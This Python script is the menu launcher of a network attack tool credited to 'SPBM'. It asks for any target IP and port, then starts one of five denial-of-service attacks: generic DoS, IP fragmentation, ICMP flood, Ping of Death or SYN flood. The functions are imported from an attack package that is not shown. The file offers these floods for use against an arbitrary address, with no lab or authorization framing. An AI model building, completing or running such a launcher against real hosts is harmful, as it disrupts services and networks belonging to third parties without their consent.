import sys
from attacks import syn_flood_attack,ping_of_death_attack,icmp_flood_attack,fragmentation_attack,dos_attack

def print_menu():
    print("""
╔══════════════════════════════════════╗
║           Network Attack             ║
║               BY SPBM                ║
╠══════════════════════════════════════╣
║            ATTACK MENU               ║
╠══════════════════════════════════════╣
║ 1. DOS Attack                        ║
║ 2. Fragmentation Attack              ║
║ 3. ICMP Flood Attack                 ║
║ 4. Ping of Death Attack              ║
║ 5. SYN Flood Attack                  ║
╚══════════════════════════════════════╝
    """)
    
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port (default 80): ") or "80")
    attack_choice = int(input("Choose attack type (1-5): "))
    
    return start_program(attack_choice, target_ip, target_port)

def start_program(value,target_ip,target_port):
    if value == 1:
        print("Dos attack Started")
        dos_attack.attack(target_ip,target_port)
    elif value == 2:
        print("fragmentation attack Started")
        fragmentation_attack.attack(target_ip,target_port)
    elif value == 3:
        print("ICMP Flood attack Started")
        icmp_flood_attack.attack(target_ip)
    elif value == 4:
        print("Ping of Death attack Started")
        ping_of_death_attack.attack(target_ip)
    elif value == 5:
        print("SYN Flood attack Started")
        syn_flood_attack.attack(target_ip,target_port)
    else :
        print("value must be between 1 and 5.")
        sys.exit(1)

if __name__ == "__main__":
    print_menu()
    #if len(sys.argv) != 4:
    #    print("Usage: sudo python main.py <program_number> <target_ip> <target_port>")
    #    sys.exit(1)
    #programm_number = sys.argv[1]
    #target_ip = sys.argv[2]
    #target_port = int(sys.argv[3])